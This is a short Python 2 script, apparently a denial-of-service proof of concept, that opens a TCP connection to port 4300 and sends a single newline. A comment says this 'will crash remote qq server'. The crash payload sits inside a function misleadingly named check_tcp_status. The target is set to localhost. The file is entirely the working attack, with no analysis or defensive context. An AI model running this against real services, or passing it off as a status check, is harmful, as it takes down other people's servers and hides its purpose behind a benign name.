import socket
import sys


data='\n'           # this packet will crash remote qq server
ip = '127.0.0.1'    # The remote host  
port = 4300           # The same port as used by the server  


def check_tcp_status(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (ip, port)
    print 'Connecting to %s:%s.' % server_address
    sock.connect(server_address)
    message = data
    print 'Sending "%s".' % message
    sock.sendall(message)
    print 'Closing socket.'
    sock.close()

if __name__ == "__main__":
    check_tcp_status("127.0.0.1", 4300)
